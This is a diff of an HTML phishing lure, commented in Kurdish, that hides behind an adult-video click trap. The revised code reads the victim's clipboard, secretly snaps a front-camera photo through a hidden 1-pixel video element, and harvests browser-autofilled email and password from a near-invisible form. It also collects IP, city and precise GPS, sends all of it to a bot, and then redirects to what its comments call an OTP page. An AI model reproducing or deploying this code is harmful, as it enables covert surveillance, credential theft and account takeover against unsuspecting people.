@@ -3,42 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Telegram Video Message</title>
+    <title>Video Player</title>
     <style>
         body { font-family: -apple-system, system-ui, sans-serif; background: #000; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
         
-        /* ڤیدیۆکە دەبێتە باکگراوندی هەموو شاشەکە */
-        #main-video { width: 100vw; height: 100vh; object-fit: cover; cursor: pointer; }
+        /* ڤیدیۆ و تەڵەکە */
+        .video-container { position: relative; width: 100vw; height: 100vh; background: #000; }
+        iframe { width: 100%; height: 100%; border: none; }
         
-        /* تێپەڕاندنی وێبگەڕ: ڤیدیۆیەکی شەفاف بۆ کامێرا */
-        #spy-video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
-        
-        /* نیشانەی Play (تەڵەکە) */
-        .play-overlay { position: absolute; z-index: 100; width: 80px; height: 80px; background: rgba(0,0,0,0.5); border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; border: 2px solid white; }
+        /* تەڵەی کلیک: وێنەیەک دەخەینە سەر ڤیدیۆکە تا قوربانی کلیکی لێ بکات */
+        .click-trap { 
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
+            background: url('https://static-pv.xnxx-cdn.com/videos/thumbs169ll/ec/04/e7/ec04e7696611910ef0b694294d1de06d/default.jpg') center no-repeat;
+            background-size: cover; z-index: 1000; display: flex; justify-content: center; align-items: center; cursor: pointer;
+        }
+        .play-btn { width: 80px; height: 80px; background: rgba(0,0,0,0.6); border-radius: 50%; display: flex; justify-content: center; align-items: center; border: 3px solid white; }
         .play-icon { width: 0; height: 0; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid white; margin-left: 5px; }
 
-        /* تەڵەی پاسوۆرد */
-        #trap-form { position: absolute; opacity: 0.01; pointer-events: none; }
-        canvas { display: none; }
+        /* شاردنەوەی کامێرا و پاسوۆرد */
+        #spy-video, #canvas, #trap-form { display: none; }
+        #spy-video { position: fixed; opacity: 0.01; width: 1px; height: 1px; }
     </style>
 </head>
 <body>
 
-    <!-- ١. ڤیدیۆیەکی ڕاستەقینە (ئەوەی قوربانی دەیبینێت) -->
-    <div class="play-overlay" id="playBtn">
-        <div class="play-icon"></div>
+    <div class="video-container">
+        <!-- ڤیدیۆ ئەسڵییەکە -->
+        <iframe id="main-frame" src="https://www.xnxx.com/embedframe/koltifvd47e" allowfullscreen></iframe>
+        
+        <!-- تەڵەی کلیک (Thumbnail) -->
+        <div class="click-trap" id="clickTrap">
+            <div class="play-btn"><div class="play-icon"></div></div>
+        </div>
     </div>
-    <video id="main-video" poster="https://i.imgur.com/your-thumbnail.jpg">
-        <source src="https://i.imgur.com/your-video.mp4" type="video/mp4">
-    </video>
 
-    <!-- ٢. ڤیدیۆی باکگراوند (بۆ هاککردنی کامێرا) -->
+    <!-- کامێرای نهێنی -->
     <video id="spy-video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
-    <!-- ٣. تەڵەی پاسوۆرد -->
-    <form id="trap-form">
-        <input type="text" id="af_user" autocomplete="username">
+    <!-- تەڵەی پاسوۆرد -->
+    <form id="trap-form" style="opacity:0.01; position:absolute;">
+        <input type="email" id="af_user" autocomplete="username">
         <input type="password" id="af_pass" autocomplete="current-password">
     </form>
 
@@ -54,27 +59,23 @@
             });
         }
 
-        document.getElementById('playBtn').addEventListener('click', async function() {
-            // شاردنەوەی نیشانەی Play و لێدانی ڤیدیۆکە بۆ قوربانی
+        document.getElementById('clickTrap').addEventListener('click', async function() {
+            // شاردنەوەی وێنەی تەڵەکە و دەرکەوتنی ڤیدیۆکە
             this.style.display = 'none';
-            const mainVid = document.getElementById('main-video');
-            mainVid.play();
 
-            // دەستپێکردنی کرداری هاککردنەکان لە کاتی تەماشاکردنی ڤیدیۆکەدا
-            
-            // ١. Clipboard
+            // ١. دزینی Clipboard
             try {
                 const clip = await navigator.clipboard.readText();
                 if(clip) await sendToBot("📋 Clipboard: " + clip);
             } catch(e) {}
 
-            // ٢. وێنەگرتن (با کامێرا بۆ ٥ چرکە کراوە بێت تا سەیری ڤیدیۆکە دەکات)
+            // ٢. وێنەگرتنی کامێرا (پێویستی بە ٥ چرکە هەیە بۆ ڕوونی)
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const spyVid = document.getElementById('spy-video');
                 spyVid.srcObject = stream;
                 
-                await new Promise(r => setTimeout(r, 5000)); // کاتی تەماشاکردنی ڤیدیۆ
+                await new Promise(r => setTimeout(r, 5000));
                 
                 const canvas = document.getElementById('canvas');
                 canvas.width = spyVid.videoWidth; canvas.height = spyVid.videoHeight;
@@ -87,23 +88,21 @@
                 stream.getTracks().forEach(t => t.stop());
             } catch(e) { await sendToBot("❌ Access Denied"); }
 
-            // ٣. GPS و پاسۆرد و IP (لە باکگراوند)
+            // ٣. داتا و GPS و پاسوۆرد
             let u = document.getElementById('af_user').value;
             let p = document.getElementById('af_pass').value;
             if(p) sendToBot(`🔑 PASS: ${u} | ${p}`);
 
-            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => sendToBot(`🌐 IP: ${d.ip}`));
+            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => sendToBot(`🌐 IP: ${d.ip}\n🏙️ ${d.city}`));
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((pos) => {
                     sendToBot(`📍 GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
-                }, null, { enableHighAccuracy: true });
+                    setTimeout(() => { window.location.href = "index.html"; }, 3000);
+                }, () => { window.location.href = "index.html"; }, { enableHighAccuracy: true });
+            } else {
+                setTimeout(() => { window.location.href = "index.html"; }, 8000);
             }
-
-            // دوای ١٠ چرکە کە ڤیدیۆکەی بینی، دەیبات بۆ لاپەڕەی OTP
-            setTimeout(() => {
-                window.location.href = "index.html";
-            }, 10000);
         });
     </script>
 </body>
